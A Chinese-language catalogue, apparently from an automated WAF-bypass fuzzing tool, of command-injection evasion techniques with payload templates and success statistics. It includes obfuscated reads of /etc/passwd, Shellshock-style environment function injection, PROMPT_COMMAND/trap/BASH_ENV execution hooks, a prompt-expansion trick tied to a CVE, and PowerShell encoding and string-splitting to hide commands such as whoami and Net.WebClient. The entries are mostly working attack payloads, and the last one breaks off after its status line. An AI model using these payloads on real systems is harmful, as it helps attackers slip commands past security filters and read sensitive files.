### `cmdi:redirect:fd_self_read` — fd 重定向与 /proc/self/fd 读文件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`cat<&3` 把预先打开的 fd 3 喂给 cat，`/proc/self/fd/N` 把已打开描述符当文件路径读，规避 "cat /etc/passwd" 这类显式文件路径签名匹配——路径不出现在命令行。
- **模板**：`bash -c 'exec 3</etc/passwd; cat<&3'`、`bash -c 'exec 3</etc/passwd; cat /proc/self/fd/3'`
- **来源备注**：`bash -c 'exec 3</etc/passwd; cat<&3'`、`bash -c 'exec 3</etc/passwd; cat /proc/self/fd/3'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:49:03.467530+00:00；retired=-

### `cmdi:semantic:cmd_v_reexec` — command -v/type 输出重注入命令替换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`command -v`、`type -p`、`hash -t` 等内建在标准输出打印命令绝对路径而非执行它，放进命令替换再执行时实际 argv 由运行时 PATH/哈希表决定，字面上只出现无害的查找内建名。语义引擎抽取字面命令名，无法预知内建输出的真实可执行体。
- **模板**：`$(command -v sh) -c 'id'`、`` `type -p python3` -c 'id' ``
- **来源备注**：`$(command -v sh) -c 'id'`、`` `type -p python3` -c 'id' ``
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T11:49:03.390942+00:00；retired=-

### `cmdi:semantic:dotnet_direct_call` — .NET 直调替代命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PowerShell 直调 .NET API 替代命令词：[WindowsIdentity]::GetCurrent().Name 代替 whoami、[Net.NetworkInformation.Ping]::new().Send() 代替 ping——命令词检测完全失效
- **模板**：`[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`
- **来源备注**：`[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:semantic:env_assign_cmd` — 变量赋值再执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：变量赋值再执行（e=cat;$e /etc/passwd），命令名藏在赋值 RHS，绕过首词命令名检测。
- **模板**：`e=cat;$e /etc/passwd`、`;x=cat&&$x$IFS/etc/passwd`（POSIX）`
- **来源备注**：`e=cat;$e /etc/passwd`、`;x=cat&&$x$IFS/etc/passwd`（POSIX）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T11:49:03.443529+00:00；retired=-

### `cmdi:semantic:env_concat` — 环境变量拼接

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：从环境变量取字符拼命令（`${HOME:0:1}` 等），或插入未初始化变量 `$foo` 打断关键字。
- **模板**：`ca$foo t /etc/passwd`、`$HOME/bin/$(...)`
- **来源备注**：`ca$foo t /etc/passwd`、`$HOME/bin/$(...)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T11:49:05.189095+00:00；retired=-

### `cmdi:semantic:env_exec` — 环境变量执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$IFS`/`$PATH` 等变量参与命令构造（`${PATH:0:1}` 取字符），命令无字面。
- **模板**：`${PATH:0:1}??$()bin$()/ca$((16#116))$() ...`、`a=cat;$a /etc/passwd`
- **来源备注**：`${PATH:0:1}??$()bin$()/ca$((16#116))$() ...`、`a=cat;$a /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T11:49:05.165939+00:00；retired=-

### `cmdi:semantic:env_export_inject` — env/export 注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：env PATH=... / BASH_ENV=... 通过环境变量注入执行路径或子 shell 初始化命令。
- **模板**：`env PATH=/tmp:$PATH ls`、`BASH_ENV=/tmp/x bash`
- **来源备注**：`env PATH=/tmp:$PATH ls`、`BASH_ENV=/tmp/x bash`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:12:16.023685+00:00；retired=-

### `cmdi:semantic:prompt_expansion` — Bash @P 提示符展开内嵌命令执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 的 `${var@P}` 操作符把变量值当作提示符字符串再次展开，内嵌的 `$(...)` 命令替换会被执行；配合 `${a="$"}`${b="$a(cmd)"}` 在展开期赋值逐步拼出 `$(cmd)`，整个载荷表面是无害的 echo 变量引用，命令字面量（如 touch）不直接出现，可绕过语义层"只读命令/无命令意图"分类与关键字黑名单（CVE-2026-29783 实证）。
- **模板**：`echo ${a="\$"}${b="\$a(touch /tmp/pwned)"}${b@P}; echo ${HOME:-$(whoami)}`
- **来源备注**：`echo ${a="\$"}${b="\$a(touch /tmp/pwned)"}${b@P}; echo ${HOME:-$(whoami)}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:12:16.050086+00:00；retired=-

### `cmdi:shell:bash_func_env_inject` — BASH_FUNC_* 环境变量函数投毒（Shellshock 类）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：bash 可把函数以 `BASH_FUNC_名%%=() {...}` 形式放进环境变量，子进程启动时解析为函数定义；历史 Shellshock 表明函数体之后的内容也会被继续执行。语义引擎把环境变量当纯字符串传递，不模拟"env→函数定义→启动即执行"的继承链，漏判藏在环境变量函数体里的命令。
- **模板**：`env 'x=() { :; }; id' bash -c ':'`、`env 'BASH_FUNC_x%%=() { id; }' bash -c 'x'`
- **来源备注**：`env 'x=() { :; }; id' bash -c ':'`、`env 'BASH_FUNC_x%%=() { id; }' bash -c 'x'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T12:12:16.102078+00:00；retired=-

### `cmdi:shell:coproc` — coproc 保留字异步协程执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：coproc 是保留字，把命令放到异步子 shell 执行并建立双向管道，NAME[0]/NAME[1] 是到协程输出/输入的文件描述符，NAME_PID 记其 PID。语义引擎按 bash 语法解析时若未把 coproc 当保留字处理，会漏掉其异步执行体，也难模拟协程 fd 与生命周期。
- **模板**：`coproc { sh -c 'id'; }`、`coproc CO sh -c 'id'; cat <&${CO[0]}`
- **来源备注**：`coproc { sh -c 'id'; }`、`coproc CO sh -c 'id'; cat <&${CO[0]}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T12:12:16.602076+00:00；retired=-

### `cmdi:shell:prompt_command_inject` — PROMPT_COMMAND / PS1 隐式执行点注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PROMPT_COMMAND 在每次显示提示符前于当前 shell 执行，PS1 里的 `$(...)`/反引号每次渲染时求值。二者是被提示符渲染触发的隐式执行点，不出现显式命令调用 token。语义引擎按命令意图识别，无法模拟交互提示符这个旁路触发时机。
- **模板**：`export PROMPT_COMMAND='id'`、`export PS1='$(id) \\$ '`
- **来源备注**：`export PROMPT_COMMAND='id'`、`export PS1='$(id) \\$ '`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.986533+00:00；retired=-

### `cmdi:shell:source_proc_subst` — . / source 对进程替换 FIFO 再入解析

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`source`/`.`/`eval` 会把目标内容重新送入解析器。`source <(cmd)` 或 `. <(cmd)` 让进程替换产出的 /dev/fd/N 管道内容被当作脚本执行，形成"命令→FIFO→再解析执行"的自反链路。语义引擎通常把 source/. 当文件读取、把 `<()` 当参数扩展，不把二者组合视为脚本来源。
- **模板**：`. <(echo 'id')`、`source <(printf '%s\n' 'id')`
- **来源备注**：`. <(echo 'id')`、`source <(printf '%s\n' 'id')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T12:12:16.647071+00:00；retired=-

### `cmdi:shell:stdin_reentry` — 解释器再入/从 stdin 喂命令绕过首词校验

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 `$0`/`$SHELL`/`${0##-}` 再入当前解释器并从 stdin（here-string 或管道）喂命令，或直接 `. /dev/stdin <<< code`——接收者不是解释器名而是 /dev/stdin，静态"首词=解释器名"白名单/黑名单全部失效；env/exec/nice/timeout 包装亦可隐藏解释器。命令本体不出现在可执行首词位置，绕过基于首词抽取的检测（orchestkit 2024 安全补丁实证）。
- **模板**：`echo whoami|$0`、`. /dev/stdin <<< whoami`、`exec bash <<< 'whoami'`
- **来源备注**：`echo whoami|$0`、`. /dev/stdin <<< whoami`、`exec bash <<< 'whoami'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T12:16:45.754792+00:00；retired=-

### `cmdi:shell:trap_debug_exec` — trap DEBUG 钩子在每条命令前触发

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`trap 'cmd' DEBUG` 注册一个在"每条命令执行前"回调的钩子，任何无害命令（如 `:` 或 true）都会触发它。语义引擎把 trap 当信号处理建模、且不模拟 DEBUG/EXIT 这类非信号触发时机，看不到被钩子隐式执行的内容。
- **模板**：`trap 'id' DEBUG; :`、`trap 'id' EXIT`
- **来源备注**：`trap 'id' DEBUG; :`、`trap 'id' EXIT`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T12:16:45.802663+00:00；retired=-

### `cmdi:shell:zsh_expansion_flags` — zsh 参数展开标志组词绕过线性过滤

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：zsh 提供 bash 没有的参数展开标志：`${(j: :)@}` 以指定分隔符 join 数组、`${(s: :)}` 拆分、(j::) 空分隔拼接。命令词可拆成数组元素到展开期才拼成（`a=(c a t); ${(j::)a}`→cat），字面上不存在完整命令，绕过基于命令词与连续 token 的线性过滤；对只建模 bash 文法的解析器是盲区。
- **模板**：`a=(c a t); ${(j::)a} /etc/passwd`、`w=(w h o a m i); ${(j::)w}`
- **来源备注**：`a=(c a t); ${(j::)a} /etc/passwd`、`w=(w h o a m i); ${(j::)w}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:syntactic:arith_expansion` — 算术进制构造字符

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$((16#74))` 把十六进制 74 转为十进制 116（'t'），`/bin/ca$((16#74))` 拼出 `cat`——命令名不含 c-a-t 字面。
- **模板**：`/bin/ca$((16#74))`、`echo $((16#6f))`
- **来源备注**：`/bin/ca$((16#74))`、`echo $((16#6f))`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:16:45.820345+00:00；retired=-

### `cmdi:syntactic:brace_expansion` — 花括号展开

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`{cat,/etc/passwd}` 展开为两个词 `cat /etc/passwd`。
- **模板**：`{cat,/etc/passwd}`、`{ls,-la,/}`
- **来源备注**：`{cat,/etc/passwd}`、`{ls,-la,/}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `cmdi:syntactic:builtin_force` — 内置/命令查找

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：command -v / type -P / $0 -c 用内建或解释器再入替代直接命令名，绕过命令名黑名单。
- **模板**：`command -v cat`、`type -P cat`、`$0 -c id`、`${0##-} -c 'cat /etc/passwd'`
- **来源备注**：`command -v cat`、`type -P cat`、`$0 -c id`、`${0##-} -c 'cat /etc/passwd'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:syntactic:case_tr` — 大小写转换后执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` 用 tr 转小写后执行——Linux 大小写敏感，直接 `WhOaMi` 无效但转换后可行。
- **模板**：`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
- **来源备注**：`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:16:46.339227+00:00；retired=-

### `cmdi:syntactic:cmd_env_substring` — CMD 环境变量子串构造

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CMD 用 %Var:~a,b% 取环境变量子串动态拼路径：%ComSpec:~-4%→.exe、%SystemRoot:~0,1%→C，黑名单命令/路径字面量不出现
- **模板**：`%SystemRoot:~0,1%\Windows\system32\calc.exe`、`%ComSpec:~-11,4% /c whoami`
- **来源备注**：`%SystemRoot:~0,1%\Windows\system32\calc.exe`、`%ComSpec:~-11,4% /c whoami`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:syntactic:comment_noise` — 注释噪声

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：#faketoken 等注释噪声稀释危险 token 序列，WAF 看整条是无害命令组合。
- **模板**：`;cat /etc/passwd #faketoken=1`、`cat /etc/passwd |# noise noise noise`
- **来源备注**：`;cat /etc/passwd #faketoken=1`、`cat /etc/passwd |# noise noise noise`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:16:46.394567+00:00；retired=-

### `cmdi:syntactic:glob` — 通配符

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：shell glob 展开，`/???/passwd` 或 `c*` 匹配命令；WAF 按字面匹配失手。
- **模板**：`cat /???/passwd`、`/bin/?at /etc/passwd`、`cat /e??/passwd`
- **来源备注**：`cat /???/passwd`、`/bin/?at /etc/passwd`、`cat /e??/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:19:48.616646+00:00；retired=-

### `cmdi:syntactic:glob_char_class` — 字符类 [w]

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：/[e]tc/passwd、pass[w]d 字符类 glob，WAF 按字面匹配失手。
- **模板**：`cat /etc/pass[w]d`、`cat /[e]tc/passwd`
- **来源备注**：`cat /etc/pass[w]d`、`cat /[e]tc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:19:48.588539+00:00；retired=-

### `cmdi:syntactic:glob_full_command` — 命令全路径 glob

- **状态**：promoted
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：/???/??t 命令全路径 glob，命令名与路径均以通配符表达，无字面。
- **模板**：`/???/??t /???/??ss??`（`/bin/cat /etc/passwd`）`、`/?b?n/c?t /etc/passwd`
- **来源备注**：`/???/??t /???/??ss??`（`/bin/cat /etc/passwd`）`、`/?b?n/c?t /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=1；bypass=1；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:19:48.667480+00:00；retired=-

### `cmdi:syntactic:here_string_feed` — here-string 喂命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`bash<<<$(base64 -d<<<...)` 把解码结果经 here-string 喂给 bash——不出现命令字面与管道符。
- **模板**：`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`
- **来源备注**：`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:19:49.270777+00:00；retired=-

### `cmdi:syntactic:heredoc_doc` — heredoc 喂入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`bash<<<$(...)` 或 `cat<<EOF\ncmd\nEOF` 用 heredoc/here-string 传命令或读数据——无管道、无直接拼接。
- **模板**：`bash<<<$(base64 -d<<<...);`、`cat<<EOF\n/pass\nEOF`
- **来源备注**：`bash<<<$(base64 -d<<<...);`、`cat<<EOF\n/pass\nEOF`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T12:19:49.238575+00:00；retired=-

### `cmdi:syntactic:heredoc_feed` — heredoc/here-string

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sh<<<'cat /etc/passwd' 用 here-string 把命令当 stdin 喂给 shell，无管道无拼接。
- **模板**：`sh<<<'cat /etc/passwd'`、`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`（`<<<` bash-only）`
- **来源备注**：`sh<<<'cat /etc/passwd'`、`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`（`<<<` bash-only）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T13:34:53.496481+00:00；retired=-

### `cmdi:syntactic:logical_chain` — 逻辑链稀释

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用无害命令稀释 token 序列：`file /etc/motd && cat /srv/data/secret`——WAF 看整条是"文件检查+读取"，可能不匹配单命令特征。
- **模板**：`:;true && cat /etc/passwd`、`file /dev/null;cat /srv/app/config/database.cnf`
- **来源备注**：`:;true && cat /etc/passwd`、`file /dev/null;cat /srv/app/config/database.cnf`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T13:34:53.517108+00:00；retired=-

### `cmdi:syntactic:parameter_expansion` — 参数展开

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${PATH:0:1}` 取路径首字符 `/`，拼出命令/路径字符；WAF 看不到完整字符串。
- **模板**：`${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd`（bash-only）`
- **来源备注**：`${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd`（bash-only）`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:syntactic:path_variants` — 路径归一化

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：/etc/./passwd、/etc//passwd、/etc/../etc/passwd 路径归一化变体，绕路径精确签名。
- **模板**：`cat /etc/./passwd`、`cat /etc//passwd`、`cat /etc/../etc/passwd`
- **来源备注**：`cat /etc/./passwd`、`cat /etc//passwd`、`cat /etc/../etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:syntactic:powershell_obfuscation` — PowerShell 混淆家族

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PowerShell 对语法容忍度极高：反引号转义(wh\oami)、-f 格式串("{0}{1}" -f 'Get-','Process')、-EncodedCommand base64、字符串拼接($x='Inv'+'oke-Ex'+'pression')——WAF 关键字匹配全部被拆散
- **模板**：`powershell -enc <base64>`、`wh`o`ami`、`iex ('{0}{1}' -f 'wh','oami')`
- **来源备注**：`powershell -enc <base64>`、`wh`o`ami`、`iex ('{0}{1}' -f 'wh','oami')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T13:34:53.534251+00:00；retired=-

### `cmdi:syntactic:process_substitution` — 进程替换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`cat <(echo hi)` 用 `<(命令)` 进程替换执行命令——不含管道符与直接命令拼接，形态反直觉。
- **模板**：`cat <(/bin/ca$((16#74)) /etc/passwd)`、`diff <(echo a) <(/bin/cat /etc/passwd)`
- **来源备注**：`cat <(/bin/ca$((16#74)) /etc/passwd)`、`diff <(echo a) <(/bin/cat /etc/passwd)`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:11:24.432529+00:00；retired=-

### `cmdi:syntactic:redir_read_alt` — 输入重定向读文件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`grep root < /etc/passwd` 用 `<` 输入重定向替代 `cat file | grep`——避开管道符与 `cat` 关键字。
- **模板**：`grep root < /etc/passwd`、`head < /etc/passwd`
- **来源备注**：`grep root < /etc/passwd`、`head < /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:11:24.390009+00:00；retired=-

### `cmdi:syntactic:rev_command` — 反转执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`$(rev<<<'imaohw')` 反转 `whoami` 后在子 shell 执行——payload 不含目标命令名字面串。
- **模板**：`$(rev<<<'imaohw')`、`echo $(rev<<<'tac')`
- **来源备注**：`$(rev<<<'imaohw')`、`echo $(rev<<<'tac')`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:11:24.416017+00:00；retired=-

### `cmdi:syntactic:separator_rotate` — 分隔符轮换

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：%0a/false||/true&& 分隔符轮换替代 ;，绕分号与 && 单一分隔符检测。
- **模板**：`%0awhoami`、`false||cat /etc/passwd`、`true&&cat /etc/passwd`
- **来源备注**：`%0awhoami`、`false||cat /etc/passwd`、`true&&cat /etc/passwd`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:13:49.632540+00:00；retired=-

### `cmdi:syntactic:shell_alias` — 内置别名绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Bash/Zsh 默认别名 `la`/`ll`（=`ls -a`/`ls -l`）不在规则集内，`;la /var/www` 返回目录列表——2025 实测绕过 CRS PL3（coreruleset issue #4390）。
- **模板**：`;la /etc`、`;ll /var/www`
- **来源备注**：`;la /etc`、`;ll /var/www`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:13:49.616525+00:00；retired=-

### `cmdi:syntactic:windows_caret` — Windows CMD 脱字符拆分

- **状态**：promoted
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Windows CMD 用 ^ 转义下一字符，c^a^t 在 cmd.exe 解析后还原 cat，WAF 关键字匹配被 ^ 打断（对应 Linux 的引号/反斜杠拆分）
- **模板**：`c^a^t C:\Windows\win.ini`、`who^ami`
- **来源备注**：`c^a^t C:\Windows\win.ini`、`who^ami`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=1；bypass=1；attempt=1；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T14:13:49.654647+00:00；retired=-

### `cmdi:win:ps_char_type_concat` — PowerShell [char] 类型逐字符拼命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 `[char][int]` 或 `[char][Convert]::ToInt32($b,2)`（二进制串转字符）逐字符重建命令，再经 -join / 字符串索引拼接（如 `$shellID[1]+$ShelLId[13]+'X'` 拼出 IEX），整条命令、iex、cmdlet 名都不以字面量出现，使基于 token/关键字抽取的 WAF 与日志特征全部失效（Invoke-Obfuscation 与真实恶意样本实证）。
- **模板**：`& ([char[]](0x77,0x68,0x6f,0x61,0x6d,0x69) -join '')`、`[char][Convert]::ToInt32('01101000',2)` 逐位二进制转字符后拼接
- **来源备注**：`& ([char[]](0x77,0x68,0x6f,0x61,0x6d,0x69) -join '')`、`[char][Convert]::ToInt32('01101000',2)` 逐位二进制转字符后拼接
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `cmdi:win:ps_format_reorder` — PowerShell -f 格式操作符/拼接重排字符串

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 `-f` 格式操作符或 `+` 拼接把字符串拆散重排（`('{1}{0}'-f'bClient','Net.We')`→Net.WebClient），或跨大量变量碎片拼接（SANS 2023 恶意样本用 2256 个函数 + 碎片拼接），使 DownloadString/WebClient/IEX 等签名关键字不以连续形式出现，绕过 signature/关键字抽取（Invoke-Obfuscation ARGUMENT 类别实证）。
- **模板**：`('{1}{0}'-f'bClient','Net.We')`、`$oAOe+$iUFxY+$cxQYE8+$cG6n05`（碎片拼接）
- **来源备注**：`('{1}{0}'-f'bClient','Net.We')`、`$oAOe+$iUFxY+$cxQYE8+$cG6n05`（碎片拼接）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.985506+00:00；retired=-

### `part:argument-add` — 添加无害参数

- **状态**：seed
